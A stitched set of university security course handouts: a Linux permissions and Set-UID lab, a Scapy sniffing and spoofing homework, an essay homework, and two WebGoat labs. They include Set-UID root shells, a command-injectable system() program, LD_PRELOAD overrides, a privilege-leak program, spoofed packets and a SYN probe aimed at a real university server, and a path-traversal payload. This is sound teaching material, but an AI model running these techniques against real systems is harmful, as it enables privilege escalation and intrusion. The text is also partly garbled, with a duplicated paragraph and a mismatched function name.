NOTE: For your lab report, you need to reply to questions that are marked in red.
NOTE: Make sure that your hostname is your EUID with a ‘lab’ suffix and for your default user, use your EUID. For example, assuming your EUID is ab1234, the computer name (hostname) would be ab1234lab and the user would be ab1234.
When it is required to “attach a screenshot”, feel free to attach several screenshots if needed. If the screenshot requires your terminal and commands, you need to make sure that your hostname and username are clearly visible. 
⦁	Introduction
⦁	Unix File Hierarchy
The Unix/Linux file system is organized as a hierarchy with the root (/) directory at the highest level. Some typical Unix system directories are /usr, /bin, /sbin, /home, /var, /boot, /dev, /etc, and others. In the figure shown below, “user1” and “user2” are the subdirectories of the directory “home”, “hello.txt” is a plain text file and “link_hello” is a link file that points to “hello.txt”.
In order to access the file “/test/temp/hello.txt”, the system begins its search from the root (/) directory, then “test” and “temp” directories consecutively, and then finally it finds the file “hello.txt”.
 

⦁	Ownership and Permissions
Ownership of files in UNIX can be viewed in one of three ways: owner (creator), group or others (i.e., all the other users, apart from the owner and the group members). Using this simple notion of ownership, access to files can be controlled by associating a unique user ID (UID) and a group ID (GID) with twelve permission bits for each file. Typically, these bits are divided into three sets of three bits each, as well as three extra bits as shown in the table below.
The values “r”, “w” and “x” stand for read, write and execute bits for each of the owner, group and others permissions. The values “su”, “sg” and “t” stand for set_user_id, set_group_id and the sticky bit, respectively. These 4 sets of bits are often represented in their octal digits. 
For example, “100 111 101 101” is represented as “4755.” When the “su” bit is set, the UID of the process will be that of the owner of the file, no matter who executes the file. Similarly, if the “sg” bit is set, the GID of the process will be that of the group.
⦁	Lab Procedures
⦁	Exercise 3.1: Setting up the file structure and the user space
The objective of this exercise is to setup the file hierarchy structure and the user accounts that are required for the exercises in this section. The su command is used to switch users.
NOTE: Ideally, after all the operations intended to be performed under the privileges of a user are completed, it is better to “exit” from that user. However, for the purposes of the lab, su will be done repeatedly in order to train you to switch users.
⦁	Login as root
⦁	sudo su
⦁	enter password when prompted.
⦁	Now you are root, and the ‘#’ prompt represents the root mode 
(while the prompt ‘$’ represents the ordinary user mode).
2. Use useradd command to create two new users user1 and user2 (you can name them by your choice and follow that name in place of user1 and user2 in the document) as follows:
⦁	useradd user1 -g users 
⦁	mkdir /home/user1
⦁	chown user1:users /home/user1
⦁	useradd user2 -g users 
⦁	mkdir /home/user2
⦁	chown user2:users /home/user2
Q1: Provide a screenshot of your commands
3. Use passwd command to set the password for the users you created (required in the case you want to log in). For convenience, set the passwords to be the same as the usernames. You need to retype the passwords and ignore password warnings:
a. passwd user1 (your username)
b. passwd user2 (your username)
4. Check user information with the id command. Note the uid, gid for each output.
a. id user1
b. id user2 
Q2: Provide a screenshot of your commands
5. Create directory structure
a. mkdir /test
b. mkdir /test/temp 
6. Switch user roles as user1 and then back to root using the su command
a. whoami
b. sudo su user1 (check ‘$’ indicate user mode)
c. sudo su OR sudo su root (unable to switch root? You might want to add user11 to the sudoers file)
7. Create a new file as root user
a. touch /home/user2/HelloWorld
b. ls -l /home/user2/HelloWorld 
Q3: Who is its owner and what is its group?
8. Change group ownership as well as user ownership of the file
a. chgrp users /home/user2/HelloWorld
b. chown user2:users /home/user2/HelloWorld
c. ls -l /home/user2/HelloWorld 
Q4: Who is its owner and what is its group?
⦁	Exercise 3.2: Differences in File and Folder Permissions
The objective of the following exercises is to see differences between file and folder (directory) permissions. The chmod command will be used to change the file and directory permissions to demonstrate these differences.
1. Observe the result of ls and cd commands
a. cd /
b. ls -l
c. ls -al /home
Q5: What are the directory permissions for user1, user2 and test directories? Provide a screenshot and explain. 
d. Switch to user1 using su user1
e. ls -al /home/user2 
Q6: Can you list the directory?
f. cd /home/user2 
Q7: Can you change the directory?

2. Change directory permissions of user2 directory and try again as user1.
a. sudo su root 
b. chmod 740 /home/user2
c. Repeat steps 1d to 1f 
Q8: Can you list or change the directory?
d. sudo su root
            e. chmod 750 /home/user2
f. Repeat steps 1d to 1f 
Q9: Can you list or change the directory?)
g. touch /home/user2/hello12.txt
Q10: Can you create a new file?)
h. sudo su root 
i. chmod 770 /home/user2
j. sudo su user1
k. Repeat step 2g. 
Q11: Can you create a new file?
l. ls –l /home/user2
⦁	Exercise 3.3: Text files and link files
Unix supports two kinds of link files—a hard link and a symbolic link. A hard link is a file with the actual address space of some ordinary file’s data blocks. A symbolic (or soft)  link is just a reference to another file. It contains the pathname to some other file. It is basically a shortcut to a file, which is typically used to access it. (Similarly to shortcuts in Windows.)
Unix supports two kinds of link files—a hard link and a symbolic link. A hard link is a file with the actual address space of some ordinary file’s data blocks. A symbolic (or soft)  link is just a reference to another file. It contains the pathname to some other file. It is basically a shortcut to a file, which is typically used to access it. (Similarly to shortcuts in Windows.)
1. In the /test/temp/ directory, as the root user, create a new text file (“hello.txt”) and fill it with some text.
a. echo something > /test/temp/hello.txt 
2. Create a link link_hello in the test folder pointing to hello.txt in the temp folder (refer to the file structure in the introduction of the file hierarchy).
a. cd /
b. ln -s /test/temp/hello.txt /test/link_hello
Q12: Is there any difference in file permissions of link_hello and hello.txt? Explain why. 
Q13: cat /test/link_hello —what is the output? Explain.
⦁	Exercise 3.4: Default file permissions and group access control
Whenever a new file is created, a default set of permissions is assigned to it. Whatever the permissions are, the UNIX system allows a user to filter out unwanted permissions set by default. This default setting can be set by the user using the umask command. The command takes the permissions set during creation of file and performs a bitwise AND to the bitwise negation of the mask value. Some common umask values are 077 (only user has permissions), 022 (only owner can write), 002 (only owner and group members can write), etc.
1. In a terminal window, make sure you are the root user, otherwise switch back to the root user.
2. Use umask command to check the current mask permission and assign a new mask.
a. umask
Q14: What is the current mask? How is it interpreted? (try umask –S or the man pages)
b. cd /test
c. touch testmask1
d. ls -al
e. What are the permissions of the file “testmask1”?
f. umask 0077
g. touch testmask2
h. Now, what are the permissions of the file “testmask2”?


Q15: What does it mean if the umask value is set to 0000? Explain in detail. 

Q16: The risks of setting the extra bits (i.e., assigning their value to “1”) will be covered in Exercise 3.5, which shows that the extra bits should not be set, in general. What should be the umask value to ensure that the extra bits cannot be set?
⦁	Exercise 3.5: setuid bit, setgid bit and sticky bit
As explained in the ownership and permission section, the highest three bits of the permission value of a file represent the setuid bit, setgid bit and the sticky bit. If the setuid bit is set then the uid will always be set to the owner of the file during execution. If the setuid bit is not set then the uid will be that of the user who executes the process. Similarly, if the setgid bit is set then the gid will be set to the group that owns the file during execution. If the setgid bit is not set then the gid will be that of the group that executes the process. The sticky bit lets only the owner of the file or directory (and in addition the root user) to delete or rename it.
In the following exercise, the objective is to demonstrate how processes are affected when the setuid bit is set. The exercise must be begun with root privileges.
a. which touch
b. ls –l /bin/touch
c. chmod 4755 /bin/touch
d. ls –l /bin/touch
e. ls –l /home/user2
f. chmod 700 /home/user2/HelloWorld
g. ls –l /home/user2 (observe timestamp and permissions)
h. sudo su user1  
i. touch /home/user2/HelloWorld
j. ls –l /home/user2 (observe timestamp, is it updated?)
k. sudo su root
l. chmod 0755 /bin/touch
m. sudo su user1
n. touch /home/user2/HelloWorld

Q17: Provide a screenshot of the commands (together if possible)

Q18: Explain why permission is denied, even though previously allowed?
⦁	RESTORE THE SYSTEM
Below are the set of commands that you should issue to restore the system to its original form (commands No. 4 and 5 could take some time).
⦁	sudo su root
⦁	umask 0022
⦁	chmod 0755 /bin/touch
⦁	userdel user1
⦁	userdel user2
⦁	rm –rf /home/user1
⦁	rm –rf /home/user2
⦁	rm –rf /test
⦁	rm –rf /home/test/
Q19: Provide a screenshot of the commands (together if possible)
⦁	Set-UID Program Vulnerability
Set-UID is an important security mechanism in Unix operating systems. When a Set-UID program (executable) is run, it assumes the owner's privileges. For example, if the program's owner is root, then it gains the root's privileges during its execution, no matter who runs it. 
Set-UID allows ordinary users to gain access to many important functionalities, but unfortunately, it is also the source of many vulnerabilities. 
The objectives of this lab are to let the students:
(1) Appreciate its positive side: to understand why Set-UID is needed and how it is implemented.
(2) Become aware of its negative side: to understand potential security problems that it may cause.

Lab Tasks:
This is an exploration lab. Your main task is to “play” with the Set-UID mechanism in Linux. You are required to accomplish the following tasks in Linux:

Note: Please refer to the Lab 1a manual for the basic Linux commands. For example, we assume that the students know that when the lab instructs to copy a file, the cp command should be used. For information on working with umask, see, e.g., the following:

https://www.linuxnix.com/umask-define-linuxunix/ 
 
Q20: Figure out why ""passwd,"" ""chsh,"" ""su,"" and ""sudo"" commands need to be Set-UID programs. What will happen if they are not? If you are not familiar with these commands, you should first learn about them by reading their manuals (For example man su, man chsh, etc.). 
2. Run Set-UID shell programs in Linux, then describe and explain your observations.
a. Login as root (or become root).
⦁	apt-get update
⦁	apt-get install zsh
⦁	Copy /bin/zsh to /tmp (cp /bin/zsh /tmp), and make it a set-root-uid program with permission 4755 (chmod 4755 zsh).
⦁	cd /tmp
⦁	ls –la  //to see the permission change  
b. Add a new user.
⦁	adduser bob (username of your choice)
⦁	Enter your password.
⦁	Next, enter the password of the new user “bob” (username), after pressing Enter complete the user details.
⦁	su bob (username)
c. Then login as a normal user, and run /tmp/zsh. Will you get root privilege? 
⦁	./zsh //this is to run the zsh 
Notice: the hostname is now “unt-sec”.
⦁	pwd  //see that your current folder; it to should be /tmp 
⦁	cd /root  //change directory to root folder
⦁	pwd //notice that you entered the root folder while you are not root 
⦁	exit //to come out of the zsh shell

d. Perform the same steps as in the above step (c) for bash:
Instead of copying /bin/zsh, copy /bin/bash to /tmp. Make it a set-root-uid program with permission 4755. Run /tmp/bash as a normal user. Try to go to the root directory.
Q21: Can you get access to the root privilege?
Q22: Please describe and explain your observations when performing steps (c) and (d).

3. As you will see from the previous task, /bin/bash has a certain built-in protection that prevents abuse of the Set-UID mechanism. In order to understand the issues, which arise when such the protection is not implemented, we are going to use a different shell program called /bin/zsh. 
In some Linux distributions (such as Fedora and Ubuntu), /bin/sh is actually a symbolic link to /bin/bash. To use zsh, we need to link /bin/sh to /bin/zsh. The following instructions describe how to change the default shell to zsh.
⦁	sudo su
Password: (enter root password)
⦁	cd /bin
⦁	rm –rf sh //to remove the original sh shell
⦁	ln -s zsh sh //to create a symbolic link of the vulnerable zsh shell to be sh.
Q23: Provide a screenshot of your commands

4. The PATH environment variable:
The system (const char *cmd) library function can be used to execute a command within a program. The way system (cmd) works is to invoke the /bin/sh program, and then let the shell program to execute cmd. Since the shell program is invoked, calling system() within a Set-UID program is extremely dangerous. This is because the actual behavior of the shell program can be affected by environment variables, such as PATH. These environment variables are under user’s control. By changing these variables, attackers (malicious users) can control behavior of Set-UID programs. In bash, you can change the PATH environment variable in the following way (this example adds the directory /home/sec-lab to the beginning of the PATH environment variable):
⦁	sudo su
⦁	export PATH=/home/sec-lab:$PATH

The Set-UID program below is supposed to execute the /bin/ls command; however, suppose that the programmer only uses the relative path for the ls command, rather than the absolute path:
A. Create a file: make sure you are still in the bin folder (if not, then cd /bin)
a) nano setUID.c
b)  copy the following code to the file:
#include <stdio.h >
int main()
{
     system(""ls -la"");
     return 0;
}
c) gcc -o setUID setUID.c //this is to compile the c code. 
Q24: Give a screenshot. 
d) sudo chmod 4755 setUID
e) ./setUID //to execute the executable file
Q25: Show the output (screenshot). Notice the output. 
f) cd /usr/local/
g) ls –la
Q26: Show the output (screenshot)
Notice that the “bin” folder is owned by root (normal users, processes and programs should not have direct access) and your program had access to it as it used the setUID.
Q27: Can you let this Set-UID program (owned by root) run your code instead of /bin/ls? If you can, is your code running with the root privilege? Describe and explain your observations.
⦁	 Now, change /bin/sh so it points back to /bin/bash, and repeat the above attack.
⦁	cd /bin/
⦁	rm –rf sh
⦁	ln -s bash sh
Q28: Can you still get the root privilege? Describe and explain your observations.
5. The difference between system() and execve(). 
NOTE: Before you work on this task, please make sure that /bin/sh is linked to /bin/zsh, using the following steps:
⦁	cd /bin/
⦁	rm –rf  sh
⦁	ln -s zsh sh
Q29: Provide a screenshot of your commands (together if possible).  
Background: Suppose that Bob works for an auditing agency, and he needs to investigate a company for a suspected fraud. For the investigation purpose, Bob needs to be able to read all the files in the company’s Unix system. At the same time, to protect the integrity of the system, Bob should not be able to modify any file. To achieve this goal, Vince, the superuser of the system, wrote a special set-root-uid program (see below), and then gave the executable permission to Bob. This program requires Bob to type a file name at the command line, and then it will run /bin/cat to display the specified file.
Since the program is running as a root, it can display any file that Bob specifies. However, since the program has no write operations, Vince is sure that Bob cannot use this special program to modify any file.
⦁	Create a file as root in /home/<user-name>/Desktop   
// Note: the /<user-name>/ should be replaced with your username (e.g., “sec-admin”).
⦁	nano topSecretFile.txt
⦁	Enter any text in the file. 
⦁	Create a file as a root user in /home/<user-name>/Desktop 
//Note: the /<user-name>/ should be replaced with your username (e.g., “sec-admin”).
Copy-paste the below code to the file you created. 
⦁	nano hack.c
⦁	Copy the below code to this file. 

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    	char *v[3];
    
if (argc < 2) 
{
    printf(""Please type a file name.\n"");
    return 1;
}

v[0] = ""/bin/cat""; v[1] = argv[1]; v[2] = 0;

/* Set q = 0 for Question a, and q = 1 for Question b */
int q = 0;
if (q == 0)
{
char *command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
sprintf(command, ""%s %s"", v[0], v[1]);
system(command);
}
 else execve(v[0], v[1], 0);
 return 0 ;
}

Once you have copied and pasted the code compile it.
a. gcc –o code  hack.c
b. ./code topSecretFile.txt  
The text file containing some secret information that you created earlier is passed as an argument in the command line.
Q30: Provide a screenshot of your commands (together if possible).  
A.	Set q = 0 in the program. This way, the program will use system() to invoke the command. 
Q31: Is this program safe? If you were Bob, can you compromise the integrity of the system? For example, can you delete any file without proper permissions? 
(Hint: Remember that system() actually invokes /bin/sh, and then runs the command within the shell environment. We tried an attack that exploited the environment variable in the previous task. Here, let us try a different approach. Please pay attention to the special characters used in a normal shell environment).

B.	Set q = 1 in the program. This way, the program will use execve() to invoke the command.
Q32: Do your attacks from task (a) still work? Please describe and explain your observations.


6. The LD_PRELOAD environment variable.
In order to make sure that Set-UID programs are safe from the manipulation of the LD_PRELOAD environment variable, the runtime linker (ld.so) will ignore this variable if the program is a Set-UID root program, except for some conditions. 
We will figure out what these conditions are in this task.
⦁	Let us build a dynamic link library. Create the following program, and name it “mylib.c”. It basically overrides the sleep() function in libc:

#include <stdio.h>
void sleep (int s)
{
    printf(""I am not sleeping!\n"");
}

⦁	We can compile the above program using the following commands (in the arguments below, the third character in “-Wl” and the first character in “-lc” are a lowercase “L”, not a digit one):
⦁	gcc -fPIC -g -c mylib.c
⦁	 gcc -shared -Wl,-soname,libmylib.so.1 -o libmylib.so.1.0.1 mylib.o –lc
Q33: Provide a screenshot of your outputs. 
⦁	Now, set the LD_PRELOAD environment variable:
⦁	export LD_PRELOAD=./libmylib.so.1.0.1
Q34: Provide a screenshot of your commands (together if possible).  
⦁	Finally, compile the following program myprog (put this program in the same directory as libmylib.so.1.0.1):

/* myprog.c */
int main()
{
sleep(1);
return 0;
}

gcc -o myprog myprog.c  
Q35: Provide a screenshot of your commands (together if possible).  
// Make sure you are root when compiling the “myprog.c” program.
// Do not execute it immediately, instead, follow the below instructions.

Q36: Run “myprog” under the following conditions, and observe what happens. Provide screenshot for the commands and their outputs. Based on your observations, tell us when the runtime linker will ignore the LD_PRELOAD environment variable, and explain why.
⦁	Run it as a normal user (not as root):
⦁	./myprog
⦁	Make “myprog” a Set-UID root program, and run it as a normal user:
⦁	chmod 4755 myprog   //to make it set-UID
⦁	./myprog
⦁	Make “myprog” a Set-UID root program, and run under the root privileges.
⦁	./myprog   //remember that you are effectively root, when executing it
⦁	Make “myprog” a Set-UID user1 program (i.e., its owner is user1, which is another user account), and run it as a normal user (not root).
⦁	adduser user1
⦁	enter the user password
⦁	 chown user1 myprog

⦁	7. Relinquishing privileges and cleanup.
To be more secure, Set-UID programs usually call setuid() system call to permanently relinquish their root privileges. However, sometimes, this is not enough. When a privileged process transitions to a non-privileged process, one of the common problems that may occur is the so called “capability leaking”. The process may have gained some capabilities when it was still privileged. When the privileges are downgraded, if the program does not properly clean up these capabilities, they may still be accessible by the non-privileged processes.
For example, after a file is opened, its file descriptor is created, and the latter represents a form of capability, because whoever carries it is able of accessing the corresponding file.
The program relinquishes the process’ capability by calling setuid(), but “forgets” to close the file. Now, its descriptor represents a “leaked” capability.

Compile the following program (see the next page), and make the program a set-root-uid program.
⦁	Assuming you call your program hack.c (see its source on the next page):
⦁	gcc -o hack hack.c
⦁	chmod 4755 hack
⦁	./hack    // when executing the code, run it as a normal user.
Q37: Provide a screenshot of your commands (together if possible).  
Q38: Describe what you have observed. Will the file /etc/zzz be modified? Please explain your observation.

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

void main()
{
int fd;

/* Assume that /etc/zzz is an important system file,
* and it is owned by root with permission 0644.
* Before running this program, you should create
* the file /etc/zzz first. */

fd = open(""/etc/zzz"", O_RDWR | O_APPEND);

if (fd == -1)
{
printf(""Cannot open /etc/zzz\n"");
exit(0);
}

/* Simulate the tasks conducted by the program */
sleep(1);

/* After the task, the root privileges are no longer needed; it is time to relinquish the root privileges permanently. */

setuid(getuid());  /* getuid() returns the real uid */

if (fork())
{ 
/* In the parent process */
close (fd);
exit(0);
} else { 
/* in the child process */
/* Now, assume that the child process is compromised, malicious attackers have injected the following statements into this process */

write (fd, ""Malicious Data\n"", 15);
close (fd);
}
}




⦁	References

Wenliang Du, “Set-UID Privileged Programs” Lecture Notes of CIS/CSE 643: Computer Security, Syracuse University
http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Set_UID.pdf

The SET-UID man page 
http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Vulnerability/Set-UID/files/setuid.pdf

How to write a SETUID Program
http://nob.cs.ucdavis.edu/~bishop/secprog/1987-sproglogin.pdf

Wenliang Du, “Computer & Internet Security – A Hands-on Approach”, 2nd ed., 2019."
"['sniffing and spoofing', 'attach a screenshot', 'python script', 'run', 'sniffing', 'spoofing', 'script', 'python', 'attach', 'terminal window', 'scapy', 'unt', 'sniffer.py', 'window', 'python scripts', 'terminal', 'run the script', 'csce', 'homework', 'fall', 'sudo', 'file', 'screenshot', 'display', 'packet']",The University of North Texas,INTRO TO COMPUTER SECURITY,5550,Sniffing Spoofing,Homework,"Student Name:
Course: CSCE 5550
Semester: Fall 2022
Homework 2: Sniffing and Spoofing
Homework 2: Sniffing and Spoofing
Due on Oct 2 at 11:59pm
Grading Rubric: Each question is worth 15 points. 
Total: 105 points (the actual grade will not exceed 100 points).
Submission Guide: You must submit the homework assignment (DOCX or PDF) and 
all the created Python scripts: mycode.py, sniffer.py, spoof.py, and dns.py; 
the Python scripts must be placed into a separate ZIP archive. 
Failure to submit them will result in deduction of 5 points per missing script.
This lab uses the Kali 2020 virtual machine (VM). The credentials are: 
Username: osboxes
Password: osboxes.org
IMPORTANT NOTE: Before starting this assignment, you must customize your command 
prompt as described in the Command Prompt Customization Manual. This customization 
manual directs you to place your EUID (Enterprise User ID) into the command prompt. 
Submissions which do not comply with this requirement will receive no credit.
In this homework, we will study packet sniffing and spoofing using Scapy ( https://scapy.net/ ), 
a Python library for packet manipulation.
1. Open a terminal, create a directory “hw2” and change your current directory to “hw2”.
2. Let us install the scapy library. Run the following commands. 
(You should wait till the first one is completed, and then run the second one.)
sudo apt update
sudo apt install python3-scapy
3. Create the following Python script, and place it in a file “mycode.py”:
from scapy.all import *
a = IP()
a.show()
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Homework 2: Sniffing and Spoofing
In the above code, we import all the Scapy’s modules (for convenience), then we generate an IP 
packet and display it.
4. Run this file:
python3 mycode.py
Q1: Attach a screenshot of the result. 
5. Next, let us construct a simple sniffer tool. Create the following Python script, and place it in 
a file “sniffer.py”:
from scapy.all import *
def pkt_display(pkt): 
 pkt.show()
sniff(prn = display_pkt)
6. Run the script:
python3 sniffer.py
Q2: Attach a screenshot of the result.
Note: Root privileges are needed to send packets, so let us try again. 
7. Run the script:
sudo python3 sniffer.py
If nothing is happening, open the browser and access “http://www.unt.edu”.
Now, your sniffer will display the captured packets.
8. In the terminal window, stop the packet capture using Ctrl+C.
Q3: Attach a screenshot of the result.
9. Add a filter to intercept only ICMP packets. In the file “sniffer.py”, update the last line to 
the following:
sniff(filter=’icmp’, prn = display_pkt)
10. Run the script:
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Homework 2: Sniffing and Spoofing
sudo python3 sniffer.py
Return to the browser window, reload the UNT webpage and observe that your sniffer does not 
capture any packets.
11. Open a new terminal window and type:
ping www.unt.edu
Return to the original terminal window and observe that your sniffer is now capturing packets 
as expected.
Q4: Attach a screenshot of the result.
12. Let us now limit the sniffing to our own loopback interface. In the file “sniffer.py”, update 
the last line to the following (the values set for the “iface” parameters are the English letters, 
the first two letters of the word “loopback”):
sniff(iface=’lo’, filter=’icmp’, prn = display_pkt)
13. Run the script:
sudo python3 sniffer.py
14. Now, let us construct an ICMP request as if was coming from the UNT webserver.
In a new terminal window, change the directory to “hw2”, create the following Python script, 
and place it into a file “spoof.py”:
from scapy.all import *
send(IP(src=”129.120.231.230”,dst=”127.0.0.1”)/ICMP())
Note: In Scapy, the symbol “/” is a composition operator, which is used to stack different layers.
15. Run the script:
sudo python3 spoof.py
Return to the original terminal window and observe that your sniffer captured an ICMP echo 
request with the source IP address 129.120.231.230 belonging to the UNT webserver.
Remark: Your sniffer may display the echo request packet information twice – this is a known glitch 
of Scapy when working with the loopback interface.
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Homework 2: Sniffing and Spoofing
Q5: Attach a screenshot of the result.
16. Let us run a TCP SYN scan on the UNT webserver. For this step, we will use Scapy in 
the interactive mode. Open a new terminal window and run the following command:
sudo scapy -H
then, we will use the function “sr1()” – it sends the packet, which is defined by its arguments, 
and returns the first reply. Run the following command:
sr1(IP(dst=""129.120.231.230"")/TCP(dport=80,flags=""S""))
Q6: Attach a screenshot. Explain your observations. Specifically, what kind of response did you 
receive from the UNT server?
17. Let us create a DNS query – this will be a legitimate query, i.e., no attacks will be performed. 
Open a terminal window and change the directory to “hw2”. Create the following Python script, 
and place it into a file “dns.py”:
from scapy.all import *
dns_req = IP(dst='8.8.8.8')/UDP()/DNS(rd=1,qd=DNSQR(qname='www.unt.edu'))
answer = sr1(dns_req)
print(answer[DNS].show())
18. Run the script:
sudo python3 dns.py
Q7: Attach a screenshot. Make sure that it shows a correct IP address of the UNT server 
(we have seen this address in the previous steps). 
References
1. The SEED Lab “Sniffing and Spoofing”: 
https://seedsecuritylabs.org/Labs_20.04/Networking/Sniffing_Spoofing/ 
2. Scapy Documentation: https://scapy.readthedocs.io/en/latest/usage.html
Student Name:
Course: CSCE 5550
Semester: Fall 2022
Homework 2: Sniffing and Spoofing
3. Scapy on thePacketGeek: https://thepacketgeek.com/scapy/"
"['text document', 'document in canvas', 'form of submission', 'canvas list', 'security requirement', 'considered when developing', 'security plan', 'state a security', 'state', 'bonus', 'due', 'pdf', 'word', 'security', 'thursday', 'form', 'text', 'document', 'canvas', 'developing a security', 'system', 'requirement', 'homework', '11:59']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Software Vulnerability,Homework,"Homework 8 (BONUS)
Due: 11:59 PM on Thursday, May 5, 2022
Form of submission: PDF, Word, or Text Document in Canvas

List three factors that should be considered when developing a security plan.



(a) 	State a security requirement that is not realistic.


(b)	State a security requirement that is not verifiable.


(c)	State two security requirements that are inconsistent.


For a financial institution, such as a bank, what are the most important assets? What are the minimal computing resources it would need to continue business for a limited period (up to 2 days)? What other systems or processes could it use during the period of a disaster?



When is an incident over? That is, what factors influence whether to continue the work of the incident-handling team or to disband it?



You discover that your computing system has been infected by a piece of malicious code. You have no idea when the infection occurred. You do have backups performed every week since the system was put into operation, but there have been numerous changes to the system over time. How could you use the backups to construct a “clean” version of your system? Be specific!



List the issues involved in the software vulnerability reporting argument (i.e., such as why a company may wait to report a vulnerability that could cause a data breach).
What are the technical issues?


What are the psychological issues?


What are the managerial issues?


What are the economic issues?


What are the ethical issues?
"
"['access control', 'access control vulnerability', 'goat access control', 'access', 'access control lab', 'webgoat access control', 'access control matrix', 'control', 'click', 'access control flaws', 'webgoat', 'control vulnerability', 'access control mechanism', 'web-based access control', 'web goat access', 'shown', 'access control scheme', 'start', 'server', 'control lab', 'type', 'control matrix', 'ova file', 'goat access']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,WebGoat Access Control,Lab,"Lab 4: WebGoat Access Control Lab

This lab uses the Kali-20 virtual machine (VM). The credentials are: 
Username: osboxes
Password: osboxes.org

⦁        Introduction
Web Goat Access Control Vulnerability
In this section, we study an attack using access control vulnerability on a web-based access control mechanism, which is simulated by WebGoat. A tomcat server which is running in the background allows various users to access resources (files and folders on the server).
We use the “Webscarab” tool to intercept the traffic between client (web browser) and tomcat server, and gain unauthorized access to a restricted resource on the server.

Download the VM and setup WebGoat:
⦁        Make sure you have Oracle Virtual Box 6.1.x installed in your machine.
⦁        Download the Kali VM OVA file from the link given on the lab page. 
⦁        On your local machine, double-click on the OVA file to import the VM to VirtualBox.
⦁        Click “Import” to import the VM. (This may take a few minutes.)
(See the screenshot below.)  
 

⦁        Start the VM login with the following credentials:
Username: osboxes
Password: osboxes.org

 

⦁        After logging in, click on the terminal icon as shown below to start the terminal:
 

⦁        Type the command “docker run -p 8080:8080 -t webgoat/webgoat-7.1” and hit enter,
 as shown below:

 

⦁        You will get a web server started:

 



Normally, you should see a message as above, if WebGoat’s tomcat server start successfully.
(Sometimes, the notifications as above are not shown, so please proceed with the next command, regardless whether you see the notifications or not.)

Type : “http://127.0.0.1:8080/webgoat/attack”  in the browser address bar to start the WebGoat. 
                                                     (OR)
Type : “localhost:8080/WebGoat/login.mvc”  in the browser address bar to start the WebGoat.

Default passwords are shown on the below screenshot:

 

Use the “guest” login to start the WebGoat.

 



⦁        Section 1: Access Control Matrix

⦁        Click on Access Control Flaws on the side bar and then “Using AccessControl Matrix” link below it.

 

⦁        You will see a list of users from the drop-down menu next to “Change user:”.
and the list of resources (folders) from the drop-down menu 
next to “Select Resource:”.
⦁        Each user has access to specific files. Select a user from dropdown (Ex: moe), select a resource (Ex: Public Share) and click on the Check Access  button.
You will see the current permission, if you have access or not in a red line above the user name on the same screen.

⦁        Q1: To which resource(s) does the user moe not have access?
⦁        Section 2: Attack on Access Control 
⦁        Now, click on “Bypass path based access control scheme” on the side bar.
⦁        Go to Applications  Web Application Analysis and open “webscarab”.
 
⦁        
⦁        “WebScarab” window appears, which looks as shown below: 
 

d.        Go to Proxy  Manual Edit and select “Intercept requests”.
 

e.        Go to Proxy  Listeners and observe the used port.

 

f.        Next, go to the browser and open the Preferences menu as shown below.

 

g.        under Network Settings and click on Settings.
 

h.        Make the settings as below. Remove any text in the “No proxy for” box.
Give the address and port number from WebScarab and click “ok”.

 

In the Firefox URL location, type “about:config” and hit enter as shown below.
 
Click on “Accept Risk and Continue”. 
In the next window, click on “Show All”. 
 
In the search bar, type “network.proxy.allow_hijacking_localhost”, as shown below. You will see the field set to “false”, click on the button (highlighted red below) to switch it to “true”.
 
The field will be set to “true”.
 
i.        Go back to WebGoat and select one of the files in the list and click on the button “View File”.
 

j.        An intercepted request will pop up.

 


k.        In the tab “URLEncoded” below, row “Variable”, column “Value”, 
type: “../../../../../WEB-INF/spring-security.xml” 
and click the “Accept changes” button.
 

⦁        Continue clicking on the “Accept changes” button until all the intercepted requests are processed.
⦁        On the main page of WebGoat, you will see the message in red: 
“Congratulations. You have successfully completed this lesson.”
 

Q2: Why do we give the file path for spring-security.xml as relative path 
(../../../../../WEB-INF/spring-security.xml) instead of giving its absolute path?"
"['web application', 'web', 'buffer overflow', 'cross site scripting', 'click', 'web applications', 'application', 'cross site', 'buffer overflows', 'proxy manual edit', 'tom cat', 'buffer', 'cross site request', 'webgoat', 'select tom cat', 'buffer overflow attacks', 'overflow', 'site request forgery', 'apache tomcat server', 'sql injection', 'site scripting', 'web page', 'user', 'buffer overflow flaws', 'site']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,WebGoat Attacks,Lab,"Lab 2: WebGoat Attacks Lab

This lab uses the Kali 2021 virtual machine (VM) as OVA file KALI-20.ova on Canvas. The credentials are as follows: 
Username: 	osboxes
Password: 	osboxes.org

Webgoat

⦁	Type the docker command to start the web server as shown below:
> docker run -p 8080:8080 -t webgoat/webgoat-7.1

 


⦁	You will then get a web server started (no additional command here):

 

Normally, you should see a message as above if WebGoat’s Apache Tomcat server started successfully. Occasionally, the notifications as above are not shown, so please proceed with the next command, regardless of whether you see the notifications or not.

Type: ""localhost:8080/WebGoat/login.mvc"" in the browser address bar to start WebGoat.

Default passwords are shown on the below screenshot:

 

Use the ""guest"" login to start WebGoat.

 



CROSS SITE SCRIPTING 

Select the following option in the WebGoat left hand menu:
Cross Site Scripting  LAB: Cross Site Scripting
 
	
Login as user Tom Cat (employee) where password is ""tom"" in the above page. You should then see the following page or similar.

 

Select Tom Cat (employee) and then click on View Profile. Now click on Edit Profile to see the following screen.

 


Now go to Applications  03 – Web Application Analysis and run application webscarab.
 

This application is used to manipulate the data being sent using the HTTP ""POST"" method. After opening webscarab, you should see the following screen:

 
Go to Proxy  Manual Edit and select Intercept requests.
 
Go to Proxy  Listeners and observe the port and address (in the case shown, it is 127.0.01 and 8008).
 
Now go to your browser (for WebGoat) and open Preferences in the menu.
 

Under General, scroll down to find Network Settings and then click on Settings.
 
Enter the settings as below and, if applicable, remove any text in No proxy for box. Enter the address (127.0.0.1) and port number (8008) from webscarab and click OK.

 

In the browser URL location, type ""about:config"" and hit enter as shown below.
 
Click on ""Accept Risk and Continue"". 
In the next window, click on ""Show All"". 
 
In the search bar, type ""network.proxy.allow_hijacking_localhost"", as shown below. You will see the field set to ""false"". Click on the button (highlighted in red below) to switch it to ""true"".
 
